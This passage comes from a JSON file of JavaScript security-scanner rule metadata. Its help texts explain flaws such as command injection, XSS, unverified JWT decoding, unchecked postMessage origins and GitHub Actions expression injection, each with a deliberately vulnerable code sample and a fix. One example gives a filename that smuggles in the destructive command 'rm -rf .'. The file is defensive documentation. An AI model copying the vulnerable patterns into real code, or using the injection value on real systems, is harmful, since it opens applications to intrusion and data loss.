path.resolve(\"/public/\" + file);\n    console.log(\"Sending file: %s\", absolute);\n    res.sendFile(absolute);\n  }\n});\n\n```\n\n## References\n* Node.js API: [querystring](https://nodejs.org/api/querystring.html).\n* Common Weakness Enumeration: [CWE-843](https://cwe.mitre.org/data/definitions/843.html).\n"
  },
  "js/clear-text-logging": {
    "name": "Clear-text logging of sensitive information",
    "description": "Logging sensitive information without encryption or hashing can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/clear-text-logging",
    "tags": [
      "security",
      "external/cwe/cwe-312",
      "external/cwe/cwe-359",
      "external/cwe/cwe-532"
    ],
    "filename": "1b3d24d7-CleartextLogging",
    "language": "javascript",
    "help": "# Clear-text logging of sensitive information\nIf sensitive data is written to a log entry it could be exposed to an attacker who gains access to the logs.\n\nPotential attackers can obtain sensitive user data when the log output is displayed. Additionally that data may expose system information such as full path names, system information, and sometimes usernames and passwords.\n\n\n## Recommendation\nSensitive data should not be logged.\n\n\n## Example\nIn the example the entire process environment is logged using \\`console.info\\`. Regular users of the production deployed application should not have access to this much information about the environment configuration.\n\n\n```javascript\n// BAD: Logging cleartext sensitive data\nconsole.info(`[INFO] Environment: ${process.env}`);\n```\nIn the second example the data that is logged is not sensitive.\n\n\n```javascript\nlet not_sensitive_data = { a: 1, b : 2} \n// GOOD: it is fine to log data that is not sensitive\nconsole.info(`[INFO] Some object contains: ${not_sensitive_data}`);\n```\n\n## References\n* OWASP: [Insertion of Sensitive Information into Log File](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n"
  },
  "js/decode-jwt-without-verification-local-source": {
    "name": "JWT missing secret or public key verification",
    "description": "The application does not verify the JWT payload with a cryptographic secret or public key.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.0,
    "precision": "high",
    "id": "js/decode-jwt-without-verification-local-source",
    "tags": [
      "security",
      "external/cwe/cwe-347"
    ],
    "filename": "340e6a1c-decodeJwtWithoutVerificationLocalSource",
    "language": "javascript"
  },
  "js/unsafe-jquery-plugin": {
    "name": "Unsafe jQuery plugin",
    "description": "A jQuery plugin that unintentionally constructs HTML from some of its options may be unsafe to use for clients.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "high",
    "id": "js/unsafe-jquery-plugin",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116",
      "frameworks/jquery"
    ],
    "filename": "bc37419c-UnsafeJQueryPlugin",
    "language": "javascript",
    "help": "# Unsafe jQuery plugin\nLibrary plugins, such as those for the jQuery library, are often configurable through options provided by the clients of the plugin. Clients, however, do not know the implementation details of the plugin, so it is important to document the capabilities of each option. The documentation for the plugin options that the client is responsible for sanitizing is of particular importance. Otherwise, the plugin may write user input (for example, a URL query parameter) to a web page without properly sanitizing it first, which allows for a cross-site scripting vulnerability in the client application through dynamic HTML construction.\n\n\n## Recommendation\nDocument all options that can lead to cross-site scripting attacks, and guard against unsafe inputs where dynamic HTML construction is not intended.\n\n\n## Example\nThe following example shows a jQuery plugin that selects a DOM element, and copies its text content to another DOM element. The selection is performed by using the plugin option `sourceSelector` as a CSS selector.\n\n\n```javascript\njQuery.fn.copyText = function(options) {\n\t// BAD may evaluate `options.sourceSelector` as HTML\n\tvar source = jQuery(options.sourceSelector),\n\t    text = source.text();\n\tjQuery(this).text(text);\n}\n\n```\nThis is, however, not a safe plugin, since the call to `jQuery` interprets `sourceSelector` as HTML if it is a string that starts with `<`.\n\nInstead of documenting that the client is responsible for sanitizing `sourceSelector`, the plugin can use `jQuery.find` to always interpret `sourceSelector` as a CSS selector:\n\n\n```javascript\njQuery.fn.copyText = function(options) {\n\t// GOOD may not evaluate `options.sourceSelector` as HTML\n\tvar source = jQuery.find(options.sourceSelector),\n\t    text = source.text();\n\tjQuery(this).text(text);\n}\n\n```\n\n## References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* jQuery: [Plugin creation](https://learn.jquery.com/plugins/basic-plugin-creation/).\n* Bootstrap: [XSS vulnerable bootstrap plugins](https://github.com/twbs/bootstrap/pull/27047).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/xml-bomb-more-sources": {
    "name": "XML internal entity expansion with additional heuristic sources",
    "description": "Parsing user input as an XML document with arbitrary internal entity expansion is vulnerable to denial-of-service attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/xml-bomb-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-776",
      "external/cwe/cwe-400"
    ],
    "filename": "1b768d31-XmlBomb",
    "language": "javascript",
    "help": "# XML internal entity expansion with additional heuristic sources\nParsing untrusted XML files with a weakly configured XML parser may be vulnerable to denial-of-service (DoS) attacks exploiting uncontrolled internal entity expansion.\n\nIn XML, so-called *internal entities* are a mechanism for introducing an abbreviation for a piece of text or part of a document. When a parser that has been configured to expand entities encounters a reference to an internal entity, it replaces the entity by the data it represents. The replacement text may itself contain other entity references, which are expanded recursively. This means that entity expansion can increase document size dramatically.\n\nIf untrusted XML is parsed with entity expansion enabled, a malicious attacker could submit a document that contains very deeply nested entity definitions, causing the parser to take a very long time or use large amounts of memory. This is sometimes called an *XML bomb* attack.\n\n\n## Recommendation\nThe safest way to prevent XML bomb attacks is to disable entity expansion when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `libxmljs` (though not its SAX parser API), disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action is needed.\n\n\n## Example\nThe following example uses the XML parser provided by the `node-expat` package to parse a string `xmlSrc`. If that string is from an untrusted source, this code may be vulnerable to a DoS attack, since `node-expat` expands internal entities by default:\n\n\n```javascript\nconst app = require(\"express\")(),\n  expat = require(\"node-expat\");\n\napp.post(\"upload\", (req, res) => {\n  let xmlSrc = req.body,\n    parser = new expat.Parser();\n  parser.on(\"startElement\", handleStart);\n  parser.on(\"text\", handleText);\n  parser.write(xmlSrc);\n});\n\n```\nAt the time of writing, `node-expat` does not provide a way of controlling entity expansion, but the example could be rewritten to use the `sax` package instead, which only expands standard entities such as `&amp;`:\n\n\n```javascript\nconst app = require(\"express\")(),\n  sax = require(\"sax\");\n\napp.post(\"upload\", (req, res) => {\n  let xmlSrc = req.body,\n    parser = sax.parser(true);\n  parser.onopentag = handleStart;\n  parser.ontext = handleText;\n  parser.write(xmlSrc);\n});\n\n```\n\n## References\n* Wikipedia: [Billion Laughs](https://en.wikipedia.org/wiki/Billion_laughs).\n* Bryan Sullivan: [Security Briefs - XML Denial of Service Attacks and Defenses](https://msdn.microsoft.com/en-us/magazine/ee335713.aspx).\n* Common Weakness Enumeration: [CWE-776](https://cwe.mitre.org/data/definitions/776.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "js/command-line-injection-more-sources": {
    "name": "Uncontrolled command line with additional heuristic sources",
    "description": "Using externally controlled strings in a command line may allow a malicious user to change the meaning of the command.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "js/command-line-injection-more-sources",
    "tags": [
      "experimental",
      "correctness",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "3828c852-CommandInjection",
    "language": "javascript",
    "help": "# Uncontrolled command line with additional heuristic sources\nCode that passes untrusted user input directly to `child_process.exec` or similar APIs that execute shell commands allows the user to execute malicious code.\n\n\n## Recommendation\nIf possible, use APIs that don't run shell commands and that accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.\n\nIf given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.\n\nIf this approach is not viable, then add code to verify that the user input string is safe before using it.\n\n\n## Example\nThe following example shows code that extracts a filename from an HTTP query parameter that may contain untrusted data, and then embeds it into a shell command to count its lines without examining it first:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n    http = require('http'),\n    url = require('url');\n\nvar server = http.createServer(function(req, res) {\n    let file = url.parse(req.url, true).query.path;\n\n    cp.execSync(`wc -l ${file}`); // BAD\n});\n\n```\nA malicious user can take advantage of this code by executing arbitrary shell commands. For example, by providing a filename like `foo.txt; rm -rf .`, the user can first count the lines in `foo.txt` and subsequently delete all files in the current directory.\n\nTo avoid this catastrophic behavior, use an API such as `child_process.execFileSync` that does not spawn a shell by default:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n    http = require('http'),\n    url = require('url');\n\nvar server = http.createServer(function(req, res) {\n    let file = url.parse(req.url, true).query.path;\n\n    cp.execFileSync('wc', ['-l', file]); // GOOD\n});\n\n```\nIf you want to allow the user to specify other options to `wc`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n    http = require('http'),\n    url = require('url'),\n    shellQuote = require('shell-quote');\n\nvar server = http.createServer(function(req, res) {\n    let options = url.parse(req.url, true).query.options;\n\n    cp.execFileSync('wc', shellQuote.parse(options)); // GOOD\n});\n\n```\nAlternatively, the original example can be made safe by checking the filename against an allowlist of safe characters before using it:\n\n\n```javascript\nvar cp = require(\"child_process\"),\n    http = require('http'),\n    url = require('url');\n\nvar server = http.createServer(function(req, res) {\n    let file = url.parse(req.url, true).query.path;\n\n    // only allow safe characters in file name\n    if (file.match(/^[\\w\\.\\-\\/]+$/)) {\n        cp.execSync(`wc -l ${file}`); // GOOD\n    }\n});\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* npm: [shell-quote](https://www.npmjs.com/package/shell-quote).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "js/html-constructed-from-input": {
    "name": "Unsafe HTML constructed from library input",
    "description": "Using externally controlled strings to construct HTML might allow a malicious user to perform a cross-site scripting attack.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "js/html-constructed-from-input",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "bc37419c-UnsafeHtmlConstruction",
    "language": "javascript",
    "help": "# Unsafe HTML constructed from library input\nWhen a library function dynamically constructs HTML in a potentially unsafe way, then it's important to document to clients of the library that the function should only be used with trusted inputs. If the function is not documented as being potentially unsafe, then a client may inadvertently use inputs containing unsafe HTML fragments, and thereby leave the client vulnerable to cross-site scripting attacks.\n\n\n## Recommendation\nDocument all library functions that can lead to cross-site scripting attacks, and guard against unsafe inputs where dynamic HTML construction is not intended.\n\n\n## Example\nThe following example has a library function that renders a boldface name by writing to the `innerHTML` property of an element.\n\n\n```javascript\nmodule.exports = function showBoldName(name) {\n  document.getElementById('name').innerHTML = \"<b>\" + name + \"</b>\";\n}\n\n```\nThis library function, however, does not escape unsafe HTML, and a client that calls the function with user-supplied input may be vulnerable to cross-site scripting attacks.\n\nThe library could either document that this function should not be used with unsafe inputs, or use safe APIs such as `innerText`.\n\n\n```javascript\nmodule.exports = function showBoldName(name) {\n  const bold = document.createElement('b');\n  bold.innerText = name;\n  document.getElementById('name').appendChild(bold);\n}\n\n```\nAlternatively, an HTML sanitizer can be used to remove unsafe content.\n\n\n```javascript\n\nconst striptags = require('striptags');\nmodule.exports = function showBoldName(name) {\n  document.getElementById('name').innerHTML = \"<b>\" + striptags(name) + \"</b>\";\n}\n\n```\n\n## References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet).\n* OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/decode-jwt-without-verification": {
    "name": "JWT missing secret or public key verification",
    "description": "The application does not verify the JWT payload with a cryptographic secret or public key.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.0,
    "precision": "high",
    "id": "js/decode-jwt-without-verification",
    "tags": [
      "security",
      "external/cwe/cwe-347"
    ],
    "filename": "340e6a1c-decodeJwtWithoutVerification",
    "language": "javascript",
    "help": "# JWT missing secret or public key verification\nA JSON Web Token (JWT) is used for authenticating and managing users in an application.\n\nOnly Decoding JWTs without checking if they have a valid signature or not can lead to security vulnerabilities.\n\n\n## Recommendation\nDon't use methods that only decode JWT, Instead use methods that verify the signature of JWT.\n\n\n## Example\nIn the following code, you can see the proper usage of the most popular JWT libraries.\n\n\n```javascript\nconst express = require('express')\nconst app = express()\nconst jwtJsonwebtoken = require('jsonwebtoken');\nconst jwt_decode = require('jwt-decode');\nconst jwt_simple = require('jwt-simple');\nconst jose = require('jose')\nconst port = 3000\n\nfunction getSecret() {\n    return \"A Safe generated random key\"\n}\n\napp.get('/jose1', async (req, res) => {\n    const UserToken = req.headers.authorization;\n    // GOOD: with signature verification\n    await jose.jwtVerify(UserToken, new TextEncoder().encode(getSecret()))\n})\n\napp.get('/jose2', async (req, res) => {\n    const UserToken = req.headers.authorization;\n    // GOOD: first without signature verification then with signature verification for same UserToken\n    jose.decodeJwt(UserToken)\n    await jose.jwtVerify(UserToken, new TextEncoder().encode(getSecret()))\n})\n\napp.get('/jwtSimple1', (req, res) => {\n    const UserToken = req.headers.authorization;\n    // GOOD: first without signature verification then with signature verification for same UserToken\n    jwt_simple.decode(UserToken, getSecret(), false);\n    jwt_simple.decode(UserToken, getSecret());\n})\n\napp.get('/jwtSimple2', (req, res) => {\n    const UserToken = req.headers.authorization;\n    // GOOD: with signature verification\n    jwt_simple.decode(UserToken, getSecret(), true);\n    jwt_simple.decode(UserToken, getSecret());\n})\n\napp.get('/jwtJsonwebtoken1', (req, res) => {\n    const UserToken = req.headers.authorization;\n    // GOOD: with signature verification\n    jwtJsonwebtoken.verify(UserToken, getSecret())\n})\n\napp.get('/jwtJsonwebtoken2', (req, res) => {\n    const UserToken = req.headers.authorization;\n    // GOOD: first without signature verification then with signature verification for same UserToken\n    jwtJsonwebtoken.decode(UserToken)\n    jwtJsonwebtoken.verify(UserToken, getSecret())\n})\n\n\napp.listen(port, () => {\n    console.log(`Example app listening on port ${port}`)\n})\n```\nIn the following code, you can see the improper usage of the most popular JWT libraries.\n\n\n```javascript\nconst express = require('express')\nconst app = express()\nconst jwtJsonwebtoken = require('jsonwebtoken');\nconst jwt_decode = require('jwt-decode');\nconst jwt_simple = require('jwt-simple');\nconst jose = require('jose')\nconst port = 3000\n\nfunction getSecret() {\n    return \"A Safe generated random key\"\n}\napp.get('/jose', (req, res) => {\n    const UserToken = req.headers.authorization;\n    // BAD: no signature verification\n    jose.decodeJwt(UserToken)\n})\n\napp.get('/jwtDecode', (req, res) => {\n    const UserToken = req.headers.authorization;\n    // BAD: no signature verification\n    jwt_decode(UserToken)\n})\n\napp.get('/jwtSimple', (req, res) => {\n    const UserToken = req.headers.authorization;\n    // jwt.decode(token, key, noVerify, algorithm)\n    // BAD: no signature verification\n    jwt_simple.decode(UserToken, getSecret(), true);\n})\n\napp.get('/jwtJsonwebtoken', (req, res) => {\n    const UserToken = req.headers.authorization;\n    // BAD: no signature verification\n    jwtJsonwebtoken.decode(UserToken)\n})\n\napp.listen(port, () => {\n    console.log(`Example app listening on port ${port}`)\n})\n\n```\n\n## References\n* [JWT claim has not been verified](https://www.ghostccamm.com/blog/multi_strapi_vulns/#cve-2023-22893-authentication-bypass-for-aws-cognito-login-provider-in-strapi-versions-456)\n* Common Weakness Enumeration: [CWE-347](https://cwe.mitre.org/data/definitions/347.html).\n"
  },
  "js/actions/command-injection": {
    "name": "Expression injection in Actions",
    "description": "Using user-controlled GitHub Actions contexts like `run:` or `script:` may allow a malicious user to inject code into the GitHub action.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 9.3,
    "precision": "high",
    "id": "js/actions/command-injection",
    "tags": [
      "actions",
      "security",
      "external/cwe/cwe-094"
    ],
    "filename": "a2d22db7-ExpressionInjection",
    "language": "javascript",
    "help": "# Expression injection in Actions\nUsing user-controlled input in GitHub Actions may lead to code injection in contexts like *run:* or *script:*.\n\nCode injection in GitHub Actions may allow an attacker to exfiltrate any secrets used in the workflow and the temporary GitHub repository authorization token. The token might have write access to the repository, allowing an attacker to use the token to make changes to the repository.\n\n\n## Recommendation\nThe best practice to avoid code injection vulnerabilities in GitHub workflows is to set the untrusted input value of the expression to an intermediate environment variable and then use the environment variable using the native syntax of the shell/script interpreter (that is, not *${{ env.VAR }}*).\n\nIt is also recommended to limit the permissions of any tokens used by a workflow such as the GITHUB_TOKEN.\n\n\n## Example\nThe following example lets a user inject an arbitrary shell command:\n\n\n```yaml\non: issue_comment\n\njobs:\n  echo-body:\n    runs-on: ubuntu-latest\n    steps:\n    - run: |\n        echo '${{ github.event.comment.body }}'\n```\nThe following example uses an environment variable, but **still allows the injection** because of the use of expression syntax:\n\n\n```yaml\non: issue_comment\n\njobs:\n  echo-body:\n    runs-on: ubuntu-latest\n    steps:\n    -  env:\n        BODY: ${{ github.event.issue.body }}\n      run: |\n        echo '${{ env.BODY }}'\n```\nThe following example uses shell syntax to read the environment variable and will prevent the attack:\n\n\n```yaml\non: issue_comment\n\njobs:\n  echo-body:\n    runs-on: ubuntu-latest\n    steps:\n    - env:\n        BODY: ${{ github.event.issue.body }}\n      run: |\n        echo \"$BODY\"\n\n```\n\n## References\n* GitHub Security Lab Research: [Keeping your GitHub Actions and workflows secure: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input).\n* GitHub Docs: [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions).\n* GitHub Docs: [Permissions for the GITHUB_TOKEN](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "js/insufficient-key-size": {
    "name": "Use of a weak cryptographic key",
    "description": "Using a weak cryptographic key can allow an attacker to compromise security.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/insufficient-key-size",
    "tags": [
      "security",
      "external/cwe/cwe-326"
    ],
    "filename": "f5502d87-InsufficientKeySize",
    "language": "javascript",
    "help": "# Use of a weak cryptographic key\nModern encryption relies on it being computationally infeasible to break the cipher and decode a message without the key. As computational power increases, the ability to break ciphers grows and keys need to become larger.\n\n\n## Recommendation\nAn encryption key should be at least 2048-bit long when using RSA encryption, and 128-bit long when using symmetric encryption.\n\n\n## References\n* Wikipedia: [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)).\n* Wikipedia: [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard).\n* NodeJS: [Crypto](https://nodejs.org/api/crypto.html).\n* NIST: [ Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).\n* Wikipedia: [Key size](https://en.wikipedia.org/wiki/Key_size)\n* Common Weakness Enumeration: [CWE-326](https://cwe.mitre.org/data/definitions/326.html).\n"
  },
  "js/missing-origin-check": {
    "name": "Missing origin verification in `postMessage` handler",
    "description": "Missing origin verification in a `postMessage` handler allows any windows to send arbitrary data to the handler.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 5.0,
    "precision": "medium",
    "id": "js/missing-origin-check",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020",
      "external/cwe/cwe-940"
    ],
    "filename": "bc247e13-MissingOriginCheck",
    "language": "javascript",
    "help": "# Missing origin verification in `postMessage` handler\nThe `\"message\"` event is used to send messages between windows. An untrusted window can send a message to a trusted window, and it is up to the receiver to verify the legitimacy of the message. One way of performing that verification is to check the `origin` of the message ensure that it originates from a trusted window.\n\n\n## Recommendation\nAlways verify the origin of incoming messages.\n\n\n## Example\nThe example below uses a received message to execute some code. However, the origin of the message is not checked, so it might be possible for an attacker to execute arbitrary code.\n\n\n```javascript\nfunction postMessageHandler(event) {\n    let origin = event.origin.toLowerCase();\n\n    console.log(origin)\n    // BAD: the origin property is not checked\n    eval(event.data);\n}\n\nwindow.addEventListener('message', postMessageHandler, false);\n\n```\nThe example is fixed below, where the origin is checked to be trusted. It is therefore not possible for a malicious user to perform an attack using an untrusted origin.\n\n\n```javascript\nfunction postMessageHandler(event) {\n    console.log(event.origin)\n    // GOOD: the origin property is checked\n    if (event.origin === 'https://www.example.com') {\n        // do something\n    }\n}\n\nwindow.addEventListener('message', postMessageHandler, false);\n```\n\n## References\n* [Window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).\n* [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation).\n* [The pitfalls of postMessage](https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-940](https://cwe.mitre.org/data/definitions/940.html).\n"
  },
  "js/incomplete-url-scheme-check": {
    "name": "Incomplete URL scheme check",
    "description": "Checking for the \"javascript:\" URL scheme without also checking for \"vbscript:\" and \"data:\" suggests a logic error or even a security vulnerability.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/incomplete-url-scheme-check",
    "tags": [
      "security",
      "correctness",
      "external/cwe/cwe-020",
      "external/cwe/cwe-184"
    ],
    "filename": "bc247e13-IncompleteUrlSchemeCheck",
    "language": "javascript",
    "help": "# Incomplete URL scheme check\nURLs starting with `javascript:` can be used to encode JavaScript code to be executed when the URL is visited. While this is a powerful mechanism for creating feature-rich and responsive web applications, it is also a potential security risk: if the URL comes from an untrusted source, it might contain harmful JavaScript code. For this reason, many frameworks and libraries first check the URL scheme of any untrusted URL, and reject URLs with the `javascript:` scheme.\n\nHowever, the `data:` and `vbscript:` schemes can be used to represent executable code in a very similar way, so any validation logic that checks against `javascript:`, but not against `data:` and `vbscript:`, is likely to be insufficient.\n\n\n## Recommendation\nAdd checks covering both `data:` and `vbscript:`.\n\n\n## Example\nThe following function validates a (presumably untrusted) URL `url`. If it starts with `javascript:` (case-insensitive and potentially preceded by whitespace), the harmless placeholder URL `about:blank` is returned to prevent code injection; otherwise `url` itself is returned.\n\n\n```javascript\nfunction sanitizeUrl(url) {\n    let u = decodeURI(url).trim().toLowerCase();\n    if (u.startsWith(\"javascript:\"))\n        return \"about:blank\";\n    return url;\n}\n\n```\nWhile this check provides partial projection, it should be extended to cover `data:` and `vbscript:` as well:\n\n\n```javascript\nfunction sanitizeUrl(url) {\n    let u = decodeURI(url).trim().toLowerCase();\n    if (u.startsWith(\"javascript:\") || u.startsWith(\"data:\") || u.startsWith(\"vbscript:\"))\n        return \"about:blank\";\n    return url;\n}\n\n```\n\n## References\n* WHATWG: [URL schemes](https://wiki.whatwg.org/wiki/URL_schemes).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-184](https://cwe.mitre.org/data/definitions/184.html).\n"
  },
  "js/resource-exhaustion-more-sources": {
    "name": "Resource exhaustion with additional heuristic sources",
    "description": "Allocating objects or timers with user-controlled sizes or durations can cause resource exhaustion.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "id": "js/resource-exhaustion-more-sources",
    "precision": "high",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-400",
      "external/cwe/cwe-770"
    ],
    "filename": "162dc139-ResourceExhaustion",
    "language": "javascript",
    "help": "# Resource exhaustion with additional heuristic sources\nApplications are constrained by how many resources they can make use of. Failing to respect these constraints may cause the application to be unresponsive or crash. It is therefore problematic if attackers can control the sizes or lifetimes of allocated objects.\n\n\n## Recommendation\nEnsure that attackers can not control object sizes and their lifetimes. If object sizes and lifetimes must be controlled by external parties, ensure you restrict the object sizes and lifetimes so that they are within acceptable ranges.\n\n\n## Example\nThe following example allocates a buffer with a user-controlled size.\n\n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tlet buffer = Buffer.alloc(size); // BAD\n\n\t// ... use the buffer\n});\n```\nThis is problematic since an attacker can choose a size that makes the application run out of memory. Even worse, in older versions of Node.js, this could leak confidential memory. To prevent such attacks, limit the buffer size:\n\n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tif (size > 1024) {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\t\treturn;\n\t}\n\n\tlet buffer = Buffer.alloc(size); // GOOD\n\n\t// ... use the buffer\n});\n```\n\n## Example\nAs another example, consider an application that allocates an array with a user-controlled size, and then fills it with values:\n\n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tlet dogs = new Array(size).fill(\"dog\"); // BAD\n\n\t// ... use the dog\n});\n```\nThe allocation of the array itself is not problematic since arrays are allocated sparsely, but the subsequent filling of the array will take a long time, causing the application to be unresponsive, or even run out of memory. Again, a limit on the size will prevent the attack:\n\n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tif (size > 1024) {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\t\treturn;\n\t}\n\n\tlet dogs = new Array(size).fill(\"dog\"); // GOOD\n\n\t// ... use the dogs\n});\n```\n\n## Example\nFinally, the following example lets a user choose a delay after which a function is executed:\n\n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\tvar delay = parseInt(url.parse(req.url, true).query.delay);\n\n\tsetTimeout(f, delay); // BAD\n\n});\n\n```\nThis is problematic because a large delay essentially makes the application wait indefinitely before executing the function. Repeated registrations of such delays will therefore use up all of the memory in the application. A limit on the delay will prevent the attack:\n\n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\tvar delay = parseInt(url.parse(req.url, true).query.delay);\n\n\tif (delay > 1000) {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\t\treturn;\n\t}\n\n\tsetTimeout(f, delay); // GOOD\n\n});\n\n```\n\n## References\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n"
  },
  "js/insecure-temporary-file": {
    "name": "Insecure temporary file",
    "description": "Creating a temporary file that is accessible by other users can lead to information disclosure and sometimes remote code execution.",
    "kind": "path-problem",
    "id": "js/insecure-temporary-file",
    "problem.severity": "warning",
    "security-severity": 7.0,
    "precision": "medium",
    "tags": [
      "external/cwe/cwe-377",
      "external/cwe/cwe-378",
      "security"
    ],
    "filename": "ba9c4fd1-InsecureTemporaryFile",
    "language": "javascript",
    "help": "# Insecure temporary file\nTemporary files created in the operating system's temporary directory are by default accessible to other users. In some cases, this can lead to information exposure, or in the worst case, to remote code execution.\n\n\n## Recommendation\nUse a well-tested library like [tmp](https://www.npmjs.com/package/tmp) for creating temporary files. These libraries ensure both that the file is inaccessible to other users and that the file does not already exist.\n\n\n## Example\nThe following example creates a temporary file in the operating system's temporary directory.\n\n\n```javascript\nconst fs = require('fs');\nconst os = require('os');\nconst path = require('path');\n\nconst file = path.join(os.tmpdir(), \"test-\" + (new Date()).getTime() + \".txt\");\nfs.writeFileSync(file, \"content\");\n```\nThe file created above is accessible to other users, and there is no guarantee that the file does not already exist.\n\nThe below example uses the [tmp](https://www.npmjs.com/package/tmp) library to securely create a temporary file.\n\n\n```javascript\nconst fs = require('fs');\nconst tmp = require('tmp');\n\nconst file = tmp.fileSync().name;\nfs.writeFileSync(file, \"content\");\n```\n\n## References\n* 